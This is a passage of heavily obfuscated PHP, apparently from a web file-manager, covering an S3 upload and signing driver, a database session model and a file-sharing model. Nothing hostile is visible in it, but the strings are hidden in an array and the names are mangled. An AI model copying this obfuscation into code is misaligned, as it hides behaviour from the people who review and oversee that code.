$_SERVER[‚ûòÉ˜ş]; list($€ğäôİ„, $²¬Ú”‡Ø) = $this->bucketManager->stat($this->bucket, $°ëá¥¨µ); if ($€ğäôİ„) { $€ğäôİ„[$´Ñ½Áâ[86]] = intval($€ğäôİ„[$´Ñ½Áâ[1453]]); } return $€ğäôİ„; } protected function _isFolder($òƒ€ÖŒ) { $¾¦ğñØç =& $_SERVER[‚ûòÉ˜ş]; if ($òƒ€ÖŒ == $¾¦ğñØç[12] || $òƒ€ÖŒ == $¾¦ğñØç[8]) { return !0; } list($—¶Ñö»¸, $…ï™Ñù¼) = $this->bucketManager->listFiles($this->bucket, trim($òƒ€ÖŒ, $¾¦ğñØç[8]) . $¾¦ğñØç[8], $¾¦ğñØç[12], 1, $¾¦ğñØç[8]); return !empty($—¶Ñö»¸[$¾¦ğñØç[1456]]) || !empty($—¶Ñö»¸[$¾¦ğñØç[1457]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($İ—”›®Ô) { parent::__construct($İ—”›®Ô); } public function uploadFormData($åÙÔ¥­Á, $¥¬òîí± = 3600) { $ªÛ‰Æßö =& $_SERVER[‚ûòÉ˜ş]; $Òåöå³“ = $ªÛ‰Æßö[223]; $šœîşú³ = $ªÛ‰Æßö[262]; $©€ü‚ÍĞ = $ªÛ‰Æßö[72]; $—¶ÁôÆ‚ = gmdate($ªÛ‰Æßö[263]); $ä• èâå = gmdate($ªÛ‰Æßö[264]); $Õ¬Œ«ä¿ = $ªÛ‰Æßö[265]; $·Á×ÔØß = $¥¬òîí± . $ªÛ‰Æßö[12]; $¢¡”«… = $ªÛ‰Æßö[266]; $ˆ«½ïî¢ = array($this->accessKey, $ä• èâå, $this->region, $©€ü‚ÍĞ, $Õ¬Œ«ä¿); $á—ëö” = implode($ªÛ‰Æßö[8], $ˆ«½ïî¢); $’‡”¢Ñ€ = array($ªÛ‰Æßö[267] => gmdate($ªÛ‰Æßö[1365], strtotime($ªÛ‰Æßö[269])), $ªÛ‰Æßö[270] => array(array($ªÛ‰Æßö[271] => $this->bucket), array($ªÛ‰Æßö[272] => $Òåöå³“), array($ªÛ‰Æßö[273], $ªÛ‰Æßö[274], $ªÛ‰Æßö[12]), array($ªÛ‰Æßö[273], $ªÛ‰Æßö[275], $ªÛ‰Æßö[12]), array($ªÛ‰Æßö[273], $ªÛ‰Æßö[276], $ªÛ‰Æßö[12]), array($ªÛ‰Æßö[277] => $¢¡”«…), array($ªÛ‰Æßö[278] => $á—ëö”), array($ªÛ‰Æßö[279] => $šœîşú³), array($ªÛ‰Æßö[280] => $—¶ÁôÆ‚), array($ªÛ‰Æßö[281] => $·Á×ÔØß))); $¯ÄØ‹ù¾ = base64_encode(json_encode($’‡”¢Ñ€)); $Ôª™¶¼Ç = hash_hmac($ªÛ‰Æßö[282], $ä• èâå, $ªÛ‰Æßö[283] . $this->secret, !0); $È§—‰æç = hash_hmac($ªÛ‰Æßö[282], $this->region, $Ôª™¶¼Ç, !0); $¼Ûë¼Áâ = hash_hmac($ªÛ‰Æßö[282], $©€ü‚ÍĞ, $È§—‰æç, !0); $ò¥˜ùØ = hash_hmac($ªÛ‰Æßö[282], $Õ¬Œ«ä¿, $¼Ûë¼Áâ, !0); $Õì²ÁÉ = hash_hmac($ªÛ‰Æßö[282], $¯ÄØ‹ù¾, $ò¥˜ùØ); $‡«Ç×Àƒ = array($ªÛ‰Æßö[240] => $ªÛ‰Æßö[12], $ªÛ‰Æßö[284] => $ªÛ‰Æßö[12], $ªÛ‰Æßö[272] => $Òåöå³“, $ªÛ‰Æßö[277] => $¢¡”«…, $ªÛ‰Æßö[285] => $¯ÄØ‹ù¾, $ªÛ‰Æßö[286] => $á—ëö”, $ªÛ‰Æßö[287] => $šœîşú³, $ªÛ‰Æßö[288] => $—¶ÁôÆ‚, $ªÛ‰Æßö[289] => $·Á×ÔØß, $ªÛ‰Æßö[290] => $Õì²ÁÉ, $ªÛ‰Æßö[206] => $this->getHost()); return $‡«Ç×Àƒ; } public function multiUploadFormData($‰ÇÄú­ñ, $€ü‘ï— = 3600) { $¦¦÷â±½ =& $_SERVER[‚ûòÉ˜ş]; $’èüö÷ = gmdate($¦¦÷â±½[1468]); $Í‘úÊ¨ = array(); $Çí…¤š = $this->client->getUploadId($this->bucket, $‰ÇÄú­ñ, $Í‘úÊ¨); if (!$Çí…¤š) { return !1; } return array($¦¦÷â±½[248] => $Çí…¤š, $¦¦÷â±½[206] => $this->getHost() . $¦¦÷â±½[8] . $this->pathEncode($‰ÇÄú­ñ), $¦¦÷â±½[249] => $’èüö÷, $¦¦÷â±½[104] => $‰ÇÄú­ñ); } public function multiUploadAuthData($„›¹›ñŸ, $ÄœÔñÇ = array()) { $ëØÙ =& $_SERVER[‚ûòÉ˜ş]; $™¾”¯º = isset($ÄœÔñÇ[$ëØÙ[185]]) ? $ÄœÔñÇ[$ëØÙ[185]] : $ëØÙ[12]; $˜ê½¤ÉÜ = $ÄœÔñÇ[$ëØÙ[104]]; unset($ÄœÔñÇ[$ëØÙ[104]]); if (isset($ÄœÔñÇ[$ëØÙ[250]])) { return $this->listUploadParts($˜ê½¤ÉÜ, $ÄœÔñÇ); } $îô»Ü = array(); if (isset($ÄœÔñÇ[$ëØÙ[1469]])) { $îô»Ü[$ëØÙ[1470]] = $ÄœÔñÇ[$ëØÙ[1469]]; } $âå«­§— = explode($ëØÙ[208], $this->getHost()); $•ŞÁç¡Ñ = array($ëØÙ[1471] => $âå«­§—[1], $ëØÙ[1472] => $ëØÙ[12], $ëØÙ[240] => $ëØÙ[130], $ëØÙ[284] => $ÄœÔñÇ[$ëØÙ[86]]); $îª¢€œ = $ëØÙ[253]; $¿Éä»©± = $ëØÙ[8] . $this->pathEncode($˜ê½¤ÉÜ) . $™¾”¯º; $ÛÏ¥Óû = $this->client->__getSignatureV4($îô»Ü, $•ŞÁç¡Ñ, $îª¢€œ, $¿Éä»©±); if (strpos($™¾”¯º, $ëØÙ[252]) === 0) { if (isset($îô»Ü[$ëØÙ[1470]])) { $’Ô€·Ïœ = $îô»Ü[$ëØÙ[1470]]; } else { if (isset($ÛÏ¥Óû[$ëØÙ[1470]])) { $’Ô€·Ïœ = $ÛÏ¥Óû[$ëØÙ[1470]]; } else { $’Ô€·Ïœ = hash($ëØÙ[282], $ëØÙ[12]); } } return array($ëØÙ[258] => $ÛÏ¥Óû[$ëØÙ[258]], $ëØÙ[1470] => $’Ô€·Ïœ, $ëØÙ[249] => $ÛÏ¥Óû[$ëØÙ[1473]]); } return $ÛÏ¥Óû[$ëØÙ[258]]; } public function listUploadParts($Û¥›¾Ö¬, $ÊÑŸÁ¾ = array()) { $Ÿö÷‡¿ú =& $_SERVER[‚ûòÉ˜ş]; $—­æ²Ã = str_replace($Ÿö÷‡¿ú[259], $Ÿö÷‡¿ú[12], $ÊÑŸÁ¾[$Ÿö÷‡¿ú[185]]); $Ÿ§¤‰ · = $this->client->listParts($this->bucket, $Û¥›¾Ö¬, $—­æ²Ã); if (!$Ÿ§¤‰ ·) { return !1; } $…¶ƒ‹àã = $Ÿö÷‡¿ú[1474]; foreach ($Ÿ§¤‰ · as $Ò®ßÃ¬€) { $…¶ƒ‹àã .= $Ÿö÷‡¿ú[1475] . "\74\120\141\x72\164\116\x75\x6d\142\145\162\76{$Ò®ßÃ¬€[$Ÿö÷‡¿ú[1430]]}\x3c\x2f\x50\141\162\x74\x4e\165\x6d\x62\x65\x72\x3e\xa" . "\x3c\x45\x54\141\147\76{$Ò®ßÃ¬€[$Ÿö÷‡¿ú[1431]]}\74\x2f\105\x54\141\x67\76\xa" . $Ÿö÷‡¿ú[1476]; } $…¶ƒ‹àã .= $Ÿö÷‡¿ú[1477]; $îè˜•ºÈ = array(); $öÆğ…¬ = explode($Ÿö÷‡¿ú[208], $this->getHost()); $Åƒ’îŠ¢ = array($Ÿö÷‡¿ú[1471] => $öÆğ…¬[1], $Ÿö÷‡¿ú[240] => $Ÿö÷‡¿ú[130], $Ÿö÷‡¿ú[284] => strlen($…¶ƒ‹àã)); $ÏÏ‹™Óá = $Ÿö÷‡¿ú[251]; $ƒ¼§ÕÅ = $Ÿö÷‡¿ú[8] . $this->pathEncode($Û¥›¾Ö¬) . $ÊÑŸÁ¾[$Ÿö÷‡¿ú[185]]; $ŒŸ€¤©ï = $this->client->__getSignatureV4($îè˜•ºÈ, $Åƒ’îŠ¢, $ÏÏ‹™Óá, $ƒ¼§ÕÅ, $…¶ƒ‹àã); return array($Ÿö÷‡¿ú[258] => $ŒŸ€¤©ï[$Ÿö÷‡¿ú[258]], $Ÿö÷‡¿ú[249] => $ŒŸ€¤©ï[$Ÿö÷‡¿ú[1473]], $Ÿö÷‡¿ú[260] => $Ÿ§¤‰ ·, $Ÿö÷‡¿ú[1470] => $ŒŸ€¤©ï[$Ÿö÷‡¿ú[1470]]); } public function link($ö’ü•¸, $—ğ–ø†à = array()) { return parent::link($ö’ü•¸, $—ğ–ø†à); } public function fileOut($Ë³Ù…ˆà, $ŠÃÀ¥Û = false, $¦ü”ë§â = false, $ÃêĞáæ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‚ûòÉ˜ş][1478])) { return parent::fileOutServer($Ë³Ù…ˆà, $ŠÃÀ¥Û, $¦ü”ë§â, $ÃêĞáæ); } parent::fileOut($Ë³Ù…ˆà, $ŠÃÀ¥Û, $¦ü”ë§â, $ÃêĞáæ); } public function fileOutImage($ĞØ¡İ¿È, $Øí“ğëÈ = 250) { if (strstr($this->endpoint, $_SERVER[‚ûòÉ˜ş][1478])) { return parent::fileOutImageServer($ĞØ¡İ¿È, $Øí“ğëÈ); } parent::fileOutImage($ĞØ¡İ¿È, $Øí“ğëÈ); } public function fileOutLink($†ôëÓ¶Ö) { $”Ìãá‚ä =& $_SERVER[‚ûòÉ˜ş]; if (substr($†ôëÓ¶Ö, 0, 7) == $”Ìãá‚ä[1371]) { $†ôëÓ¶Ö = $”Ìãá‚ä[1372] . substr($†ôëÓ¶Ö, 7); } header($”Ìãá‚ä[172] . $†ôëÓ¶Ö); die; } public function getHost() { $‘‹áİ®¼ =& $_SERVER[‚ûòÉ˜ş]; $ùÉÔÙÔæ = str_rtrim(parent::getHost(), $‘‹áİ®¼[8] . $this->bucket); $ùÉÔÙÔæ = explode($‘‹áİ®¼[208], $ùÉÔÙÔæ); return $ùÉÔÙÔæ[0] . $‘‹áİ®¼[208] . $this->bucket . $‘‹áİ®¼[10] . $ùÉÔÙÔæ[1]; } } goto d¯¼ëÁ¼; fÙ«Ì‡æçİ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\x6d\137\163\145\x73\x73\151\x6f\156"; public function get($Æ¹ÇÅ«û) { $Š×¼›¼Õ =& $_SERVER[‚ûòÉ˜ş]; $¢™‡Àƒ = $this->where(array($Š×¼›¼Õ[2020] => $Æ¹ÇÅ«û))->find(); if (!is_array($¢™‡Àƒ)) { return !1; } return $¢™‡Àƒ[$Š×¼›¼Õ[794]]; } public function set($¶²§€–ë, $İŞºªèø, $äŞÈ°šè = 3600) { $Š‡¸ÍÈŸ =& $_SERVER[‚ûòÉ˜ş]; $‰Õù‚®ş = array($Š‡¸ÍÈŸ[2020] => $¶²§€–ë, $Š‡¸ÍÈŸ[1924] => $İŞºªèø, $Š‡¸ÍÈŸ[2021] => $äŞÈ°šè + time()); if (Session::get($Š‡¸ÍÈŸ[2022])) { $‰Õù‚®ş[$Š‡¸ÍÈŸ[1687]] = Session::get($Š‡¸ÍÈŸ[2022]); } else { $‰Õù‚®ş[$Š‡¸ÍÈŸ[1687]] = 0; } if ($this->get($¶²§€–ë)) { return $this->where(array($Š‡¸ÍÈŸ[2020] => $¶²§€–ë))->save($‰Õù‚®ş); } else { return $this->add($‰Õù‚®ş, array(), !0); } } public function remove($Éë¨­Îš) { return $this->where(array($_SERVER[‚ûòÉ˜ş][2020] => $Éë¨­Îš))->delete(); } public function clearTimeout() { return $this->where($_SERVER[‚ûòÉ˜ş][2023] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\x69\146\x79\124\151\155\x65", "\x74\x69\x6d\145", "\151\x6e\x73\145\162\x74\x2c\165\160\x64\x61\164\x65", "\x66\165\156\x63\x74\x69\x6f\156"), array("\x63\162\145\x61\x74\x65\x54\151\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\x72\x74", "\x66\165\156\x63\x74\x69\157\x6e"), array("\157\x70\164\151\x6f\x6e\x73", '', "\x69\156\x73\145\x72\164\54\x75\x70\144\141\x74\x65\x2c\163\145\x6c\x65\x63\x74", "\152\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($È÷ÆÃ¿×) { $áºÂĞÛ =& $_SERVER[‚ûòÉ˜ş]; $ô®‡€ñ = isset($È÷ÆÃ¿×[0]) ? $È÷ÆÃ¿×[0] : !1; return array($áºÂĞÛ[2024] => array(USER_ID, $áºÂĞÛ[2025]), $áºÂĞÛ[1965] => array($ô®‡€ñ, $áºÂĞÛ[2026])); } protected function listSimple() { $ØúÅÔƒ¦ = array($_SERVER[‚ûòÉ˜ş][1687] => USER_ID); $Ä’–ĞÎ  = $this->field($this->fieldList)->where($ØúÅÔƒ¦)->select(); return $Ä’–ĞÎ  ? $Ä’–ĞÎ  : array(); } protected function getInfo($‚ÑœÑÌø, $€àèĞúœ = false) { $ÇüøÈ×š =& $_SERVER[‚ûòÉ˜ş]; if ($€àèĞúœ) { return $this->_getShareInfo(array($ÇüøÈ×š[641] => $‚ÑœÑÌø)); } $ĞôŞŞ¯ = $this->cacheFunctionGet($ÇüøÈ×š[1967], $‚ÑœÑÌø); return $ĞôŞŞ¯; } public function getInfoByHash($Ñ©†å›) { return $this->_getShareInfo(array($_SERVER[‚ûòÉ˜ş][2027] => $Ñ©†å›)); } public function getInfoByPath($©Ş¹Õ) { $¢âñëíé =& $_SERVER[‚ûòÉ˜ş]; $°î¢ûØ³ = array($¢âñëíé[1687] => USER_ID, $¢âñëíé[191] => $©Ş¹Õ); return $this->_getShareInfo($°î¢ûØ³); } public function getInfoBySourcePath($ç× àµ•) { $·ÌÙ¯¬¶ =& $_SERVER[‚ûòÉ˜ş]; $öşŸ÷«ˆ = array($·ÌÙ¯¬¶[1687] => USER_ID, $·ÌÙ¯¬¶[1216] => $ç× àµ•); return $this->_getShareInfo($öşŸ÷«ˆ); } private function _getShareInfo($ÔÎŠ®ï¹) { $ŸÍ™ø¶Ñ =& $_SERVER[‚ûòÉ˜ş]; $ÆñÜ§ìå = $this->where($ÔÎŠ®ï¹)->find(); if (!$ÆñÜ§ìå) { return !1; } $ÔÎŠ®ï¹ = array($ŸÍ™ø¶Ñ[641] => $ÆñÜ§ìå[$ŸÍ™ø¶Ñ[641]]); $¤Ôòîá = $ŸÍ™ø¶Ñ[2028]; $…ÌŸŸŠ = Model($ŸÍ™ø¶Ñ[642])->order($ŸÍ™ø¶Ñ[451])->field($¤Ôòîá)->where($ÔÎŠ®ï¹)->select(); if ($ÆñÜ§ìå[$ŸÍ™ø¶Ñ[191]] == $ŸÍ™ø¶Ñ[222]) { $ÆñÜ§ìå[$ŸÍ™ø¶Ñ[97]] = IO::info($ÆñÜ§ìå[$ŸÍ™ø¶Ñ[1216]]); } else { $ÆñÜ§ìå[$ŸÍ™ø¶Ñ[97]] = Model($ŸÍ™ø¶Ñ[1373])->pathInfo($ÆñÜ§ìå[$ŸÍ™ø¶Ñ[191]]); } $ÆñÜ§ìå[$ŸÍ™ø¶Ñ[2029]] = $…ÌŸŸŠ; return $ÆñÜ§ìå; } protected function getInfoAuth($Æç•ƒ·ª) { $«¾ĞøÄÚ =& $_SERVER[‚ûòÉ˜ş]; $ø€†¼Ö÷ = $this->getInfo($Æç•ƒ·ª); if ($ø€†¼Ö÷[$«¾ĞøÄÚ[1687]] == USER_ID) { $ø€†¼Ö÷[$«¾ĞøÄÚ[463]] = $ø€†¼Ö÷[$«¾ĞøÄÚ[97]][$«¾ĞøÄÚ[463]]; } else { $ø€†¼Ö÷[$«¾ĞøÄÚ[463]] = Model($«¾ĞøÄÚ[543])->authMake($ø€†¼Ö÷[$«¾ĞøÄÚ[2029]]); } return $ø€†¼Ö÷; } protected function listData($ê‘°ÈÊ‡ = null, $â©øË·Û = 300) { $ Ú‘˜Ğ– =& $_SERVER[‚ûòÉ˜ş]; $´ÆŞŠÇ = array(array($ Ú‘˜Ğ–[538] => array($ Ú‘˜Ğ–[1053], 0), $ Ú‘˜Ğ–[639] => array($ Ú‘˜Ğ–[1053], 0), $ Ú‘˜Ğ–[2030] => $ Ú‘˜Ğ–[1983])); if ($ê‘°ÈÊ‡ == $ Ú‘˜Ğ–[2031]) { $´ÆŞŠÇ = array($ Ú‘˜Ğ–[538] => 1); } else { if ($ê‘°ÈÊ‡ == $ Ú‘˜Ğ–[1202]) { $´ÆŞŠÇ = array($ Ú‘˜Ğ–[639] => 1); } } $´ÆŞŠÇ[$ Ú‘˜Ğ–[1687]] = USER_ID; $Šà¿•Æ• = $this->where($´ÆŞŠÇ)->selectPage($â©øË·Û); return $Šà¿•Æ•; } protected function listToMe($çµ¨’Õ¬ = 300) { $€ƒ·É÷á =& $_SERVER[‚ûòÉ˜ş]; $ı²“Ñ¢Ç = Model($€ƒ·É÷á[2032])->userGroupParents(USER_ID); $–¤ Áœ = array($€ƒ·É÷á[624] => SourceModel::TYPE_USER, $€ƒ·É÷á[546] => USER_ID); if ($ı²“Ñ¢Ç) { $–¤ Áœ = array(array($€ƒ·É÷á[624] => SourceModel::TYPE_USER, $€ƒ·É÷á[546] => USER_ID), array($€ƒ·É÷á[624] => SourceModel::TYPE_GROUP, $€ƒ·É÷á[546] => array($€ƒ·É÷á[7], $ı²“Ñ¢Ç)), $€ƒ·É÷á[2030] => $€ƒ·É÷á[1983]); } $‹¢è°ñï = Model($€ƒ·É÷á[642])->where($–¤ Áœ)->selectPage($çµ¨’Õ¬); $È«ŞÁ°¹ = array_to_keyvalue_group($‹¢è°ñï[$€ƒ·É÷á[422]], $€ƒ·É÷á[641]); if (!$È«ŞÁ°¹) { return $‹¢è°ñï; } $œ°»Ğò– = $€ƒ·É÷á[2033]; $–¤ Áœ = array($€ƒ·É÷á[641] => array($€ƒ·É÷á[468], array_keys($È«ŞÁ°¹)), $€ƒ·É÷á[1687] => array($€ƒ·É÷á[1055], $€ƒ·É÷á[222])); $§¼Îúåµ = $this->field($œ°»Ğò–)->where($–¤ Áœ)->select(); foreach ($§¼Îúåµ as $ÒæŞ¹²æ => &$”¢Ã´ç“) { $”¢Ã´ç“[$€ƒ·É÷á[2029]] = $È«ŞÁ°¹[$”¢Ã´ç“[$€ƒ·É÷á[641]]]; } unset($”¢Ã´ç“); $«ÒÕğİÉ = array($€ƒ·É÷á[2034] => $§¼Îúåµ, $€ƒ·É÷á[2035] => $‹¢è°ñï[$€ƒ·É÷á[419]]); return $«ÒÕğİÉ; } protected function shareAdd($æÍã“û¦, $³°èë÷â) { $À¨ä¥Òˆ =& $_SERVER[‚ûòÉ˜ş]; $º×ªşÃğ = $this->_addShareData($æÍã“û¦, $³°èë÷â); if (!empty($³°èë÷â[$À¨ä¥Òˆ[2036]])) { $this->_shareAuthSet($º×ªşÃğ, $³°èë÷â[$À¨ä¥Òˆ[2036]]); } $this->shareEventAdd($æÍã“û¦, $³°èë÷â, $À¨ä¥Òˆ[2037]); return $º×ªşÃğ; } protected function shareAddSystem($…š¸ÑÛ, $¹—Ş–ê) { $¸ÎšÛŸµ =& $_SERVER[‚ûòÉ˜ş]; $Ëë¤ÕÊ× = $this->_addShareData($…š¸ÑÛ, $¹—Ş–ê, $¸ÎšÛŸµ[189]); $this->_shareAuthSet($Ëë¤ÕÊ×, $¹—Ş–ê[$¸ÎšÛŸµ[2036]]); return $Ëë¤ÕÊ×; } private function shareEventAdd($Ú¥í’î, $²Ğ•İ, $£Áêò¤… = "\x61\144\144") { $Äƒ¢Ü¥· =& $_SERVER[‚ûòÉ˜ş]; if (!$Ú¥í’î || $Ú¥í’î == $Äƒ¢Ü¥·[222]) { return; } if ($£Áêò¤… == $Äƒ¢Ü¥·[2037]) { if ($²Ğ•İ[$Äƒ¢Ü¥·[538]] == $Äƒ¢Ü¥·[98]) { Model($Äƒ¢Ü¥·[609])->eventShare($Ú¥í’î, $Äƒ¢Ü¥·[2038]); } if ($²Ğ•İ[$Äƒ¢Ü¥·[639]] == $Äƒ¢Ü¥·[98]) { Model($Äƒ¢Ü¥·[609])->eventShare($Ú¥í’î, $Äƒ¢Ü¥·[2039]); } return; } $úÀŒ¶Ô = $this->getInfoByPath($Ú¥í’î); $İ•ı°Ûà = $Äƒ¢Ü¥·[2040]; if ($úÀŒ¶Ô[$Äƒ¢Ü¥·[538]] == $Äƒ¢Ü¥·[222] && $²Ğ•İ[$Äƒ¢Ü¥·[538]] == $Äƒ¢Ü¥·[98]) { $İ•ı°Ûà = $Äƒ¢Ü¥·[2038]; } if ($úÀŒ¶Ô[$Äƒ¢Ü¥·[538]] == $Äƒ¢Ü¥·[98] && $²Ğ•İ[$Äƒ¢Ü¥·[538]] == $Äƒ¢Ü¥·[222]) { $İ•ı°Ûà = $Äƒ¢Ü¥·[2041]; } if ($úÀŒ¶Ô[$Äƒ¢Ü¥·[639]] == $Äƒ¢Ü¥·[222] && $²Ğ•İ[$Äƒ¢Ü¥·[639]] == $Äƒ¢Ü¥·[98]) { $İ•ı°Ûà = $Äƒ¢Ü¥·[2039]; } if ($úÀŒ¶Ô[$Äƒ¢Ü¥·[639]] == $Äƒ¢Ü¥·[98] && $²Ğ•İ[$Äƒ¢Ü¥·[639]] == $Äƒ¢Ü¥·[222]) { $İ•ı°Ûà = $Äƒ¢Ü¥·[2042]; } Model($Äƒ¢Ü¥·[609])->eventShare($Ú¥í’î, $İ•ı°Ûà); return; } private function _addShareData($“¾àêÍı, $ÅŞ¯æ• = array(), $êÆÔ¡Ô = false) { $¶Ò“Ò³Ÿ =& $_SERVER[‚ûòÉ˜ş]; $Ññæ©¾× = $êÆÔ¡Ô == $¶Ò“Ò³Ÿ[189] ? 0 : USER_ID; $ûÔ‰¶‰ = array($¶Ò“Ò³Ÿ[467] => $“¾àêÍı, $¶Ò“Ò³Ÿ[1678] => $Ññæ©¾×); if ($“¾àêÍı == 0) { $ûÔ‰¶‰ = array($¶Ò“Ò³Ÿ[2043] => $ÅŞ¯æ•[$¶Ò“Ò³Ÿ[1216]], $¶Ò“Ò³Ÿ[1678] => $Ññæ©¾×); } if ($“‹œùº¦ = $this->where($ûÔ‰¶‰)->find()) { return $“‹œùº¦[$¶Ò“Ò³Ÿ[641]]; } if ($“¾àêÍı == 0) { $·ØÃ’˜ = array($¶Ò“Ò³Ÿ[42] => get_path_this($ÅŞ¯æ•[$¶Ò“Ò³Ÿ[94]])); } else { $·ØÃ’˜ = Model($¶Ò“Ò³Ÿ[865])->sourceInfo($“¾àêÍı); if (!$·ØÃ’˜) { return !1; } } if (!$ÅŞ¯æ•[$¶Ò“Ò³Ÿ[1584]]) { $ÅŞ¯æ•[$¶Ò“Ò³Ÿ[1584]] = $·ØÃ’˜[$¶Ò“Ò³Ÿ[42]]; } $Û‡Çó’ = array($¶Ò“Ò³Ÿ[1678] => $Ññæ©¾×, $¶Ò“Ò³Ÿ[467] => $“¾àêÍı, $¶Ò“Ò³Ÿ[1584] => $¶Ò“Ò³Ÿ[12], $¶Ò“Ò³Ÿ[538] => 0, $¶Ò“Ò³Ÿ[639] => 0, $¶Ò“Ò³Ÿ[1216] => $¶Ò“Ò³Ÿ[12], $¶Ò“Ò³Ÿ[360] => $¶Ò“Ò³Ÿ[12], $¶Ò“Ò³Ÿ[929] => $¶Ò“Ò³Ÿ[12], $¶Ò“Ò³Ÿ[2044] => 0, $¶Ò“Ò³Ÿ[2045] => 0, $¶Ò“Ò³Ÿ[801] => 0, $¶Ò“Ò³Ÿ[2046] => $¶Ò“Ò³Ÿ[12], $¶Ò“Ò³Ÿ[2027] => $¶Ò“Ò³Ÿ[12]); $›“¬ƒ‘ = explode($¶Ò“Ò³Ÿ[60], $¶Ò“Ò³Ÿ[2047]); foreach ($›“¬ƒ‘ as $æöÉ§À») { if (!isset($ÅŞ¯æ•[$æöÉ§À»])) { continue; } $Û‡Çó’[$æöÉ§À»] = $ÅŞ¯æ•[$æöÉ§À»]; } $¦·¶ºÒß = $this->add($Û‡Çó’); $Ïâ·íÁŞ = array($¶Ò“Ò³Ÿ[2027] => short_id($¦·¶ºÒß)); $this->where(array($¶Ò“Ò³Ÿ[2048] => $¦·¶ºÒß))->save($Ïâ·íÁŞ); return $¦·¶ºÒß; } private function _shareAuthSet($­ì§ÙØ¾, $•ÄŒœ£) { $õŒïÌ”î =& $_SERVER[‚ûòÉ˜ş]; if (!is_array($•ÄŒœ£)) { return !1; } $¦Ê’›şª = Model($õŒïÌ”î[1993]); $¦Ê’›şª->where(array($õŒïÌ”î[641] => $­ì§ÙØ¾))->delete(); $éÉÀ°ô = array(); foreach ($•ÄŒœ£ as $ÜÆ“×¡) { $ã³†Ã“¹ = SourceModel::TYPE_USER; if ($ÜÆ“×¡[$õŒïÌ”î[188]] == SourceModel::TYPE_GROUP) { $ã³†Ã“¹ = SourceModel::TYPE_GROUP; } $³ìÑóÔ‘ = array($õŒïÌ”î[641] => $­ì§ÙØ¾, $õŒïÌ”î[188] => $ã³†Ã“¹, $õŒïÌ”î[546] => intval($ÜÆ“×¡[$õŒïÌ”î[546]]), $õŒïÌ”î[1989] => 0, $õŒïÌ”î[2049] => -1); if ($ÜÆ“×¡[$õŒïÌ”î[1989]]) { $³ìÑóÔ‘[$õŒïÌ”î[1989]] = $ÜÆ“×¡[$õŒïÌ”î[1989]]; } else { if ($ÜÆ“×¡[$õŒïÌ”î[2049]]) { $³ìÑóÔ‘[$õŒïÌ”î[2049]] = $ÜÆ“×¡[$õŒïÌ”î[2049]]; } } $éÉÀ°ô[] = $³ìÑóÔ‘; } return $¦Ê’›şª->addAll($éÉÀ°ô, array(), !0); } public function numViewAdd($®ÂÓòŒÖ) { $ïíà– =& $_SERVER[‚ûòÉ˜ş]; $£¥ë¼ŸÃ = array($ïíà–[2048] => $®ÂÓòŒÖ); $this->where($£¥ë¼ŸÃ)->setAdd($ïíà–[2044]); } public function numDownloadAdd($Ø›¤Ùï§) { $ºÈ‹å±• =& $_SERVER[‚ûòÉ˜ş]; $âÅùÓ  = array($ºÈ‹å±•[2048] => $Ø›¤Ùï§); $this->where($âÅùÓ )->setAdd($ºÈ‹å±•[2045]); } protected function shareEdit($¿–ÙÙÉ, $¦ıŠõÚà) { $Ü£Ê³ß =& $_SERVER[‚ûòÉ˜ş]; $°„“àŠ = $this->getInfo($¿–ÙÙÉ); if (!$°„“àŠ) { return !1; } $this->_checkLinkShare($¦ıŠõÚà, $°„“àŠ); $åıÕñ–“ = array(); $ŠØ®ÀœÇ = explode($Ü£Ê³ß[60], $Ü£Ê³ß[2050]); foreach ($ŠØ®ÀœÇ as $€úç¬³ş) { if (!array_key_exists($€úç¬³ş, $¦ıŠõÚà)) { continue; } $åıÕñ–“[$€úç¬³ş] = $¦ıŠõÚà[$€úç¬³ş]; } $this->shareEventAdd($°„“àŠ[$Ü£Ê³ß[191]], $¦ıŠõÚà, $Ü£Ê³ß[1855]); $this->where(array($Ü£Ê³ß[2048] => $¿–ÙÙÉ))->save($åıÕñ–“); if (isset($¦ıŠõÚà[$Ü£Ê³ß[2036]])) { $this->_shareAuthSet($¿–ÙÙÉ, $¦ıŠõÚà[$Ü£Ê³ß[2036]]); } return !0; } private function _checkLinkShare($¤®Œƒ‰¥, $¶“«°Û…) { $á´ÖàÅ… =& $_SERVER[‚ûòÉ˜ş]; if ($¤®Œƒ‰¥[$á´ÖàÅ…[538]] != $á´ÖàÅ…[98]) { return; } $Ê§ÒûŒğ = $¶“«°Û…[$á´ÖàÅ…[97]][$á´ÖàÅ…[191]]; if ($¶“«°Û…[$á´ÖàÅ…[97]][$á´ÖàÅ…[43]] != $á´ÖàÅ…[224]) { $»¶÷›¦‘ = $this->_folderReport($Ê§ÒûŒğ); if (!$»¶÷›¦‘) { return; } show_json(LNG($á´ÖàÅ…[2051]) . $á´ÖàÅ…[2052] . $»¶÷›¦‘, !1); } $Ã‚–Ê€Á = Model($á´ÖàÅ…[865])->fileInfoGet($¶“«°Û…[$á´ÖàÅ…[97]][$á´ÖàÅ…[191]]); if (!$Ã‚–Ê€Á) { return; } $÷Œ·¢–· = $this->shareFileMeta($Ã‚–Ê€Á[$á´ÖàÅ…[517]]); if (isset($÷Œ·¢–·[$á´ÖàÅ…[427]]) && $÷Œ·¢–·[$á´ÖàÅ…[427]] == $á´ÖàÅ…[98]) { show_json(LNG($á´ÖàÅ…[2053]), !1); } } private function _folderReport($ËàœèÚÏ) { $ö¢àÜËÅ =& $_SERVER[‚ûòÉ˜ş]; $¶şš”˜ = array($ö¢àÜËÅ[517] => array($ö¢àÜËÅ[1053], 0), $ö¢àÜËÅ[790] => 3); $áÓğ¼ŞÁ = Model($ö¢àÜËÅ[2054])->where($¶şš”˜)->field($ö¢àÜËÅ[517])->select(); if (!$áÓğ¼ŞÁ) { return !1; } $áÓğ¼ŞÁ = array_to_keyvalue($áÓğ¼ŞÁ, $ö¢àÜËÅ[12], $ö¢àÜËÅ[517]); $ï‚ƒ³ëÒ = $ö¢àÜËÅ[60] . $ËàœèÚÏ . $ö¢àÜËÅ[60]; $¶şš”˜ = array($ö¢àÜËÅ[517] => array($ö¢àÜËÅ[7], $áÓğ¼ŞÁ), $ö¢àÜËÅ[561] => array($ö¢àÜËÅ[435], 